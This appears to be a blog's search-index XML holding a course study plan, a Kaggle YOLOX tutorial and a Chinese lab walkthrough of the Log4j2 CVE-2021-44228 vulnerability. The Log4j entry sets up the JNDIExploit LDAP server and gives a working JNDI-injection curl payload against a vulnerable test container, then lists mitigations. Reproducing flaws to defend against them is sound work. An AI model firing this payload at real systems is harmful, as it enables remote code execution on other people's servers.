<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>学习计划</title>
      <link href="/2023/10/10/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
      <url>/2023/10/10/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><ol><li><a href="https://www.bilibili.com/video/BV1ER4y157uA/">CS50: This is CS50x</a></li><li><a href="https://www.bilibili.com/video/BV138411F7vT?p=1">CS61A: Structure and Interpretation of Computer Programs</a></li></ol><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><ol><li><a href="https://www.bilibili.com/video/BV1Hr4y137Do/?spm_id_from=333.337.search-card.all.click">Stanford CS106B/X: Programming Abstractions in C++</a></li></ol><h1 id="离散数学"><a href="#离散数学" class="headerlink" title="离散数学"></a>离散数学</h1><ol><li><a href="https://www.bilibili.com/video/BV1gh411175C/?spm_id_from=333.337.search-card.all.click">离散数学</a></li></ol><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><ol><li><a href="https://www.bilibili.com/video/BV1fu41127MN/?vd_source=fb5b9a81d7a311b5df17fb746a4f2565">MIT 6.006: Introduction to Algorithms</a></li></ol><h1 id="进阶-软件工程、算法进阶、操作系统、计算机网络"><a href="#进阶-软件工程、算法进阶、操作系统、计算机网络" class="headerlink" title="进阶(软件工程、算法进阶、操作系统、计算机网络)"></a>进阶(软件工程、算法进阶、操作系统、计算机网络)</h1><ol><li><p><a href="https://www.bilibili.com/video/BV1Tp4y197XX/">MIT 6.031: Software Construction</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1BU4y1b7RK/">CS170: Efficient Algorithms and Intractable Problems</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1iW411d7hd/">CMU 15-213 CSAPP</a></p></li><li><p><a href="https://space.bilibili.com/202224425/channel/collectiondetail?sid=192498">NJU OS: Operating System Design and Implementation</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1JV411t7ow/">USTC Computer Networking:A Top-Down Approach</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1cL411t7Fz/?spm_id_from=333.337.search-card.all.click">UCB CS186: Introduction to Database System</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Study </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j2远程代码执行漏洞（CVE-2021-44228）</title>
      <link href="/2021/12/13/Apache%20Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/"/>
      <url>/2021/12/13/Apache%20Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Log4j2远程代码执行漏洞（CVE-2021-44228）"><a href="#Apache-Log4j2远程代码执行漏洞（CVE-2021-44228）" class="headerlink" title="Apache Log4j2远程代码执行漏洞（CVE-2021-44228）"></a>Apache Log4j2远程代码执行漏洞（CVE-2021-44228）</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>  Log4j2?</p></li><li><p>  漏洞分析</p></li><li><p>  漏洞复现</p></li><li><p>  漏洞影响</p></li><li><p>  漏洞建议</p></li></ul><h2 id="Log4j2简介"><a href="#Log4j2简介" class="headerlink" title="Log4j2简介"></a>Log4j2简介</h2><p>Log4j是Apache的一个开源项目，使用Log4j可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p><p>Apache Log4j2 是 Log4j 的升级版本，该版本与之前的 log4j1.x 相比带来了显著的性能提升，并且修复一些存在于 Logback 中固有的问题的同时提供了很多在 Logback 中可用的性能提升。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞细节暂不细说，大致为format方法之中对字符进行按位比较，如果连续的两个字符是${，则进行替换操作，然后传入org.apache.logging.log4j.core.lookup.JndiLookup类的lookup方法，最后导致JNDI注入。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞复现主要参照<a href="https://github.com/christophetd/log4shell-vulnerable-app">https://github.com/christophetd/log4shell-vulnerable-app</a></p><ol><li>  准备Log4j2环境</li></ol><p>在这使用docker镜像ghcr.io/christophetd/log4shell-vulnerable-app，并将容器8080端口映射至本机8080。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app</span><br></pre></td></tr></table></figure><p><img src="https://s4.ax1x.com/2021/12/13/oO87DI.png" alt="Log4j2环境"></p><ol start="2"><li>  使用<a href="https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit</a>来启动测试的LDAP服务器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip</span><br><span class="line">unzip JNDIExploit.v1.2.zip</span><br><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888</span><br></pre></td></tr></table></figure><img src="https://s4.ax1x.com/2021/12/13/oO8TKA.png" alt="下载JNDIExploit"></li></ol><p><img src="https://s4.ax1x.com/2021/12/13/oO848e.png" alt="EXP:LDAP服务器"></p><ol start="3"><li>  JNDI注入，执行命令’touch /tmp/pwned’<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># will execute &#x27;touch /tmp/pwned&#x27;</span><br><span class="line">curl 127.0.0.1:8080 -H &#x27;X-Api-Version: $&#123;jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=&#125;&#x27;</span><br></pre></td></tr></table></figure><img src="https://s4.ax1x.com/2021/12/13/oO8hCD.png" alt="JNDI注入，执行命令"></li></ol><p><img src="https://s4.ax1x.com/2021/12/13/oO85gH.png" alt="JNDI注入，执行命令"></p><ol start="4"><li>  查看容器内’/tmp’目录下是否存在’pwned’，<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec vulnerable-app ls /tmp</span><br></pre></td></tr></table></figure><img src="https://s4.ax1x.com/2021/12/13/oO8Ivd.png" alt="查看执行结果"></li></ol><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>漏洞影响的产品版本包括：Apache Log4j2 2.0 - 2.15.0-rc1</p><p>因Log4j2被中间件、Web应用、开发框架广泛应用。以下应用及组件均受影响：<br>Jedis<br>Logging<br>Logstash<br>HikariCP<br>Hadoop Hive<br>ElasticSearch<br>Apache Solr<br>Apache Struts2<br>Apache Flink<br>Apache Druid<br>Apache Log4j SLF4J Binding<br>spring-boot-strater-log4j2<br>Camel :: Core<br>JBoss Logging 3<br>JUnit Vintage Engine<br>WSO2 Carbon Kernel Core</p><h2 id="漏洞建议"><a href="#漏洞建议" class="headerlink" title="漏洞建议"></a>漏洞建议</h2><p>建议更新Log4j2至安全版本<br><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p><p>建议同时采用如下临时措施进行漏洞防范：</p><p>1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p><p>2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p><p>3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</p><p>4）部署使用第三方防火墙产品进行安全防护。</p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文仅供学习使用，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。</p>]]></content>
      
      
      <categories>
          
          <category> Cyber Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
            <tag> Apache Log4j2 </tag>
            
            <tag> CVE-2021-44228 </tag>
            
            <tag> CNVD-2021-95914 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cowboy Outfits Detection Megvii_YOLOX</title>
      <link href="/2021/08/03/Cowboy%20Outfits%20Detection%20Megvii_YOLOX/"/>
      <url>/2021/08/03/Cowboy%20Outfits%20Detection%20Megvii_YOLOX/</url>
      
        <content type="html"><![CDATA[<h1 id="Cowboy-Outfits-Detection-Megvii-YOLOX"><a href="#Cowboy-Outfits-Detection-Megvii-YOLOX" class="headerlink" title="Cowboy Outfits Detection Megvii_YOLOX"></a>Cowboy Outfits Detection Megvii_YOLOX</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>  Install YOLOX</p></li><li><p>  Prepare CowboyOutfits datasets in YOLOX /data/datasets</p></li><li><p>  Prepare our YOLOX exp &amp; cococlasses</p></li><li><p>  Train with pre-trained models</p></li><li><p>  Evaluation </p></li><li><p>  Visualize demo</p></li><li><p>  Output &amp; Submit</p></li><li><p>  Socre</p></li></ul><h2 id="Competition"><a href="#Competition" class="headerlink" title="Competition"></a>Competition</h2><p>此次主要为李沐老师在动手学习深度学习课程中目标检测章节中的 kaggle 竞赛作业<a href="https://www.kaggle.com/c/cowboyoutfits">CowBoy Outfits Detection</a>，<a href="https://www.kaggle.com/c/cowboyoutfits/data">数据集</a>见kaggle页面，使用旷视最新的YOLOX实现目标检测。</p><h2 id="YOLOX"><a href="#YOLOX" class="headerlink" title="YOLOX"></a>YOLOX</h2><p><img src="https://z3.ax1x.com/2021/08/03/fPjkpq.png" alt="YOLOX"></p><p><a href="https://github.com/Megvii-BaseDetection/YOLOX">https://github.com/Megvii-BaseDetection/YOLOX</a></p><p>YOLOX is an anchor-free version of YOLO, with a simpler design but better performance! It aims to bridge the gap between research and industrial communities. For more details, please refer to Megvii’s <a href="https://arxiv.org/abs/2107.08430">report on Arxiv</a></p><h2 id="Install-YOLOX"><a href="#Install-YOLOX" class="headerlink" title="Install YOLOX"></a>Install YOLOX</h2><ol><li>  Install YOLOX</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%%capture</span><br><span class="line">!git clone https://github.com/Megvii-BaseDetection/YOLOX.git</span><br><span class="line">!pip3 install -r YOLOX/requirements.txt</span><br><span class="line">!cd YOLOX &amp;&amp; pip install -e .</span><br></pre></td></tr></table></figure><ol start="2"><li>  Install <a href="https://github.com/NVIDIA/apex">apex</a> &amp; <a href="https://github.com/cocodataset/cocoapi">pycocotools</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%%capture</span><br><span class="line">!git clone https://github.com/NVIDIA/apex</span><br><span class="line">!cd apex &amp;&amp; pip3 install -v --disable-pip-version-check --no-cache-<span class="built_in">dir</span> --<span class="keyword">global</span>-option=<span class="string">&quot;--cpp_ext&quot;</span> --<span class="keyword">global</span>-option=<span class="string">&quot;--cuda_ext&quot;</span> ./</span><br><span class="line">!pip3 install cython</span><br><span class="line">!pip3 install <span class="string">&#x27;git+https://github.com/cocodataset/cocoapi.git#subdirectory=PythonAPI&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Prepare-CowboyOutfits-datasets-in-YOLOX-data-datasets"><a href="#Prepare-CowboyOutfits-datasets-in-YOLOX-data-datasets" class="headerlink" title="Prepare CowboyOutfits datasets in YOLOX /data/datasets"></a>Prepare CowboyOutfits datasets in YOLOX /data/datasets</h2><ol><li>   Because the image_id is too large, direct use of the data set will report an error,so replace image_id and create a new mapping of category_id to 1-5 ( Thanks <a href="https://www.kaggle.com/herunyu/yolox-for-cowboyoutfits#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">yyHry</a>,this part is using his code )</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: can<span class="string">&#x27;t convert np.ndarray of type numpy.ulonglong. The only supported types are: float64, float32, float16, complex64, complex128, int64, int32, int16, int8, uint8, and bool.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="comment"># data_list = [&#x27;merged_train.json&#x27;,]</span></span><br><span class="line">data_list = [<span class="string">&#x27;/kaggle/input/cowboyoutfits/train.json&#x27;</span>]</span><br><span class="line"><span class="comment"># data_list = [&#x27;new_valid.json&#x27;]</span></span><br><span class="line"></span><br><span class="line">cat = &#123;<span class="number">87</span>:<span class="number">1</span>, <span class="number">1034</span>:<span class="number">5</span>, <span class="number">131</span>:<span class="number">2</span>, <span class="number">318</span>:<span class="number">3</span>, <span class="number">588</span>:<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">dict_list = []</span><br><span class="line"><span class="keyword">for</span> idx, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(data_list):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(data) <span class="keyword">as</span> f:</span><br><span class="line">        dict_list.append(json.load(f))</span><br><span class="line"></span><br><span class="line">new_data = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(dict_list[<span class="number">0</span>].keys())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_data[<span class="string">&#x27;info&#x27;</span>] = dict_list[<span class="number">0</span>][<span class="string">&#x27;info&#x27;</span>]</span><br><span class="line"><span class="comment"># new_data[&#x27;licenses&#x27;] = dict_list[0][&#x27;licenses&#x27;]</span></span><br><span class="line">new_categories = []</span><br><span class="line"><span class="keyword">for</span> category <span class="keyword">in</span> dict_list[<span class="number">0</span>][<span class="string">&#x27;categories&#x27;</span>]:</span><br><span class="line">    new_category = deepcopy(category)</span><br><span class="line">    new_category[<span class="string">&#x27;id&#x27;</span>] = cat[category[<span class="string">&#x27;id&#x27;</span>]]</span><br><span class="line">    new_categories.append(new_category)</span><br><span class="line">new_data[<span class="string">&#x27;categories&#x27;</span>] = new_categories</span><br><span class="line">new_data[<span class="string">&#x27;annotations&#x27;</span>] = []</span><br><span class="line">new_data[<span class="string">&#x27;images&#x27;</span>] = []</span><br><span class="line"><span class="built_in">print</span>(new_data)</span><br><span class="line"></span><br><span class="line">anno_count = <span class="number">1</span></span><br><span class="line">anno_id_dict = &#123;&#125;</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">anno_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> dict_list:</span><br><span class="line">    annotations = []</span><br><span class="line">    <span class="keyword">for</span> annotation <span class="keyword">in</span> data[<span class="string">&#x27;annotations&#x27;</span>]:</span><br><span class="line">        new_annotation = deepcopy(annotation)</span><br><span class="line">        new_annotation[<span class="string">&#x27;category_id&#x27;</span>] = cat[annotation[<span class="string">&#x27;category_id&#x27;</span>]]</span><br><span class="line">        <span class="keyword">if</span> annotation[<span class="string">&#x27;image_id&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> anno_dict:</span><br><span class="line">            new_annotation[<span class="string">&#x27;image_id&#x27;</span>] = anno_count</span><br><span class="line">            anno_dict[annotation[<span class="string">&#x27;image_id&#x27;</span>]] = anno_count</span><br><span class="line">            anno_count += <span class="number">1</span></span><br><span class="line">            anno_id_dict[anno_count] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_annotation[<span class="string">&#x27;image_id&#x27;</span>] = anno_dict[annotation[<span class="string">&#x27;image_id&#x27;</span>]]</span><br><span class="line">            anno_id_dict[anno_dict[annotation[<span class="string">&#x27;image_id&#x27;</span>]]] += <span class="number">1</span></span><br><span class="line">        new_annotation[<span class="string">&#x27;id&#x27;</span>] = count</span><br><span class="line">        count +=<span class="number">1</span></span><br><span class="line">        annotations.append(new_annotation)</span><br><span class="line">    </span><br><span class="line">    new_data[<span class="string">&#x27;annotations&#x27;</span>] = annotations</span><br><span class="line"></span><br><span class="line">    images = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> data[<span class="string">&#x27;images&#x27;</span>]:</span><br><span class="line">        new_image = deepcopy(image)</span><br><span class="line">        new_image[<span class="string">&#x27;id&#x27;</span>] = anno_dict[image[<span class="string">&#x27;id&#x27;</span>]]</span><br><span class="line">        images.append(new_image)</span><br><span class="line">    new_data[<span class="string">&#x27;images&#x27;</span>] = images</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;annotation size: <span class="subst">&#123;<span class="built_in">len</span>(new_data[<span class="string">&quot;annotations&quot;</span>])&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;image size: <span class="subst">&#123;<span class="built_in">len</span>(new_data[<span class="string">&quot;images&quot;</span>])&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./train.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> res:</span><br><span class="line">    json.dump(new_data, res)</span><br></pre></td></tr></table></figure><ol start="2"><li>  Split Train and Valid Data Set  ( Thanks <a href="https://www.kaggle.com/nekokiku">nekokiku </a> &amp; <a href="https://www.kaggle.com/zhreshold">Joshua Z. Zhang</a>,this part is using their code )</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pycocotools.coco <span class="keyword">import</span> COCO</span><br><span class="line"></span><br><span class="line"><span class="comment">#def create_subset(c, cats, test_n=180):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_subset</span>(<span class="params">c, cats, test_n=<span class="number">2</span></span>):</span></span><br><span class="line">    new_coco = &#123;&#125;</span><br><span class="line">    new_coco[<span class="string">&#x27;info&#x27;</span>] = &#123;<span class="string">&quot;description&quot;</span>: <span class="string">&quot;CowboySuit&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://github.com/dmlc/glu|on-cv&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;year&quot;</span>: <span class="number">2021</span>,</span><br><span class="line">                        <span class="string">&quot;contributor&quot;</span>: <span class="string">&quot;GluonCV/AutoGluon&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;date_created&quot;</span>: <span class="string">&quot;2021/07/01&quot;</span>&#125;</span><br><span class="line">    new_coco[<span class="string">&quot;licenses&quot;</span>]: [</span><br><span class="line">        &#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://creativecommons.org/licenses/by/2.0/&quot;</span>,<span class="string">&quot;id&quot;</span>: <span class="number">4</span>,<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Attribution License&quot;</span>&#125;]</span><br><span class="line">    cat_ids = c.getCatIds(cats)</span><br><span class="line">    train_img_ids = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    test_img_ids = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> cat <span class="keyword">in</span> cat_ids[::-<span class="number">1</span>]:</span><br><span class="line">        img_ids = copy.copy(c.getImgIds(catIds=[cat]))</span><br><span class="line">        random.shuffle(img_ids)</span><br><span class="line">        tn = <span class="built_in">min</span>(test_n, <span class="built_in">int</span>(<span class="built_in">len</span>(img_ids) * <span class="number">0.5</span>))</span><br><span class="line">        new_test = <span class="built_in">set</span>(img_ids[:tn])</span><br><span class="line">        exist_test_ids = new_test.intersection(train_img_ids)</span><br><span class="line">        test_ids = new_test.difference(exist_test_ids)</span><br><span class="line">        train_ids = <span class="built_in">set</span>(img_ids).difference(test_ids)</span><br><span class="line">        <span class="built_in">print</span>(tn, <span class="built_in">len</span>(img_ids), <span class="built_in">len</span>(new_test), <span class="built_in">len</span>(test_ids), <span class="built_in">len</span>(train_ids))</span><br><span class="line">        train_img_ids.update(train_ids)</span><br><span class="line">        test_img_ids.update(test_ids)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(test_img_ids))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># prune duplicates</span></span><br><span class="line">    dup = train_img_ids.intersection(test_img_ids)</span><br><span class="line">    train_img_ids = train_img_ids - dup</span><br><span class="line"></span><br><span class="line">    train_anno_ids = <span class="built_in">set</span>()</span><br><span class="line">    test_anno_ids = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> cat <span class="keyword">in</span> cat_ids:</span><br><span class="line">        train_anno_ids.update(c.getAnnIds(imgIds=<span class="built_in">list</span>(train_img_ids), catIds=[cat]))</span><br><span class="line">        test_anno_ids.update(c.getAnnIds(imgIds=<span class="built_in">list</span>(test_img_ids), catIds=[cat]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(train_img_ids.intersection(test_img_ids)) == <span class="number">0</span>, <span class="string">&#x27;img id conflicts, &#123;&#125; &#x27;</span>.<span class="built_in">format</span>(train_img_ids.intersection(test_img_ids))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(train_anno_ids.intersection(test_anno_ids)) == <span class="number">0</span>, <span class="string">&#x27;anno id conflicts&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;train img ids #:&#x27;</span>, <span class="built_in">len</span>(train_img_ids), <span class="string">&#x27;train anno #:&#x27;</span>, <span class="built_in">len</span>(train_anno_ids))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test img ids #:&#x27;</span>, <span class="built_in">len</span>(test_img_ids), <span class="string">&#x27;test anno #:&#x27;</span>, <span class="built_in">len</span>(test_anno_ids))</span><br><span class="line">    new_coco_test = copy.deepcopy(new_coco)</span><br><span class="line"></span><br><span class="line">    new_coco[<span class="string">&quot;images&quot;</span>] = c.loadImgs(<span class="built_in">list</span>(train_img_ids))</span><br><span class="line">    new_coco[<span class="string">&quot;annotations&quot;</span>] = c.loadAnns(<span class="built_in">list</span>(train_anno_ids))</span><br><span class="line">    <span class="keyword">for</span> ann <span class="keyword">in</span> new_coco[<span class="string">&quot;annotations&quot;</span>]:</span><br><span class="line">        ann.pop(<span class="string">&#x27;segmentation&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    new_coco[<span class="string">&quot;categories&quot;</span>] = c.loadCats(cat_ids)</span><br><span class="line"></span><br><span class="line">    new_coco_test[<span class="string">&quot;images&quot;</span>] = c.loadImgs(<span class="built_in">list</span>(test_img_ids))</span><br><span class="line">    new_coco_test[<span class="string">&quot;annotations&quot;</span>] = c.loadAnns(<span class="built_in">list</span>(test_anno_ids))</span><br><span class="line">    <span class="keyword">for</span> ann <span class="keyword">in</span> new_coco_test[<span class="string">&quot;annotations&quot;</span>]:</span><br><span class="line">        ann.pop(<span class="string">&#x27;segmentation&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    new_coco_test[<span class="string">&quot;categories&quot;</span>] = c.loadCats(cat_ids)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new train split, images:&#x27;</span>, <span class="built_in">len</span>(new_coco[<span class="string">&quot;images&quot;</span>]), <span class="string">&#x27;annos:&#x27;</span>, <span class="built_in">len</span>(new_coco[<span class="string">&quot;annotations&quot;</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new test split, images:&#x27;</span>, <span class="built_in">len</span>(new_coco_test[<span class="string">&quot;images&quot;</span>]), <span class="string">&#x27;annos:&#x27;</span>, <span class="built_in">len</span>(new_coco_test[<span class="string">&quot;annotations&quot;</span>]))</span><br><span class="line">    <span class="keyword">return</span> new_coco, new_coco_test</span><br><span class="line"></span><br><span class="line">coco = COCO(<span class="string">&#x27;./train.json&#x27;</span>)</span><br><span class="line"></span><br><span class="line">nc, nc_test = create_subset(coco, [<span class="string">&#x27;belt&#x27;</span>, <span class="string">&#x27;sunglasses&#x27;</span>, <span class="string">&#x27;boot&#x27;</span>, <span class="string">&#x27;cowboy_hat&#x27;</span>, <span class="string">&#x27;jacket&#x27;</span>, ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./new_train.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(nc, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./new_valid.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(nc_test, f)</span><br></pre></td></tr></table></figure><ol start="3"><li>  Prepare CowboyOutfits datasets in YOLOX /data/datasets</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mkdir YOLOX/datasets/COCO</span><br><span class="line">!mkdir YOLOX/datasets/COCO/annotations</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!cp new_train.json YOLOX/datasets/COCO/annotations/instances_train2017.json</span><br><span class="line"><span class="comment">#!cp ../input/cowboy-outfits/train.json YOLOX/datasets/COCO/annotations/instances_train2017.json</span></span><br><span class="line">!cp new_valid.json YOLOX/datasets/COCO/annotations/instances_val2017.json</span><br><span class="line">!ls 